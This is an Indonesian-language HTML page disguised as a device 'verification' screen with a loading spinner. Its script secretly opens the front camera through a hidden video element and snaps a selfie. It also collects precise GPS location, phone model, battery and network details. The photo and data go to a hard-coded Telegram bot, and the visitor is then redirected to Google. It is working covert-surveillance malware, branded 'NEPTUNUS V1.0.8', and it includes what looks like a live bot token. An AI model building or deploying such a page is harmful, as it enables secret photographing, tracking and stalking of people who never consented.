<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Sedang memverifikasi perangkat anda...</p>

    <!-- Elemen Video Tersembunyi -->
    <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0; transform: scaleX(-1);" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
        const CHAT_ID = '6888530451';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Database identifikasi model HP
        function translateModel(model) {
            const brands = {
                // Xiaomi
                '2310FPCA4G': 'Xiaomi Redmi 13C',
                '2201117TY': 'Redmi Note 11',
                '21061119AL': 'Xiaomi Mi 11 Lite',
                '2201116SG': 'Redmi Note 11 Pro',
                'M2012K11AG': 'POCO F3',
                // Samsung
                'SM-G991B': 'Samsung S21',
                'SM-A525F': 'Samsung Galaxy A52',
                'SM-A125F': 'Samsung Galaxy A12',
                'SM-M315F': 'Samsung Galaxy M31',
                // Oppo & Realme
                'CPH2219': 'Oppo A94',
                'CPH2127': 'Oppo A53',
                'RMX3363': 'Realme GT Master Edition',
                'RMX2151': 'Realme 7',
                // Infinix & Vivo
                'X688B': 'Infinix Hot 10',
                'V2025': 'Vivo V20',
                // Generic
                'CPH': 'Oppo Device',
                'RMX': 'Realme Device',
                'SM-': 'Samsung Galaxy'
            };

            for (let key in brands) {
                if (model.includes(key)) return brands[key];
            }
            return model;
        }

        async function getFullDeviceName() {
            let model = "Android Mobile";
            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                    if (hints.model) return translateModel(hints.model);
                } catch (e) {}
            }
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            if (match && match[1]) {
                const parts = match[1].split(';');
                for (let part of parts) {
                    part = part.trim();
                    if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
                    return translateModel(part);
                }
            }
            return model;
        }

        // Mendapatkan Lokasi GPS
        function getGeoLocation() {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                        },
                        () => resolve("Izin Lokasi Ditolak"),
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                } else {
                    resolve("Tidak Didukung");
                }
            });
        }

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(takeSnapshot, 3000);
                };
            } catch (err) {
                // Jika akses kamera ditolak
                window.location.href = "https://google.com";
            }
        }

        async function takeSnapshot() {
            // Informasi Baterai
            let battery = "N/A";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                }
            } catch (e) {}

            const deviceName = await getFullDeviceName();
            const locationLink = await getGeoLocation();

            const info = `📸 <b>Berhasil mengambil foto</b>\n\n` +
                         `📱 <b>Perangkat:</b> <code>${deviceName}</code>\n` +
                         `🔋 <b>Baterai:</b> ${battery}\n` +
                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : '4G'}\n` +
                         `📍 <b>Lokasi:</b> ${locationLink}\n` +
                         `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
                         `🌍 <b>Sistem:</b> Android\n\n` +
                         `<i>NEPTUNUS V1.0.8</i>`;

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const ctx = canvas.getContext('2d');
            // Mirroring agar tidak terbalik
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                if (!blob) { window.location.href = "https://google.com"; return; }
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                formData.append('caption', info);
                formData.append('parse_mode', 'HTML');

                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).finally(() => {
                    // Redirect ke Google setelah selesai
                    window.location.href = "https://google.com";
                });
            }, 'image/jpeg', 0.8);
        }

        window.onload = startCamera;
    </script>
</body>
</html>
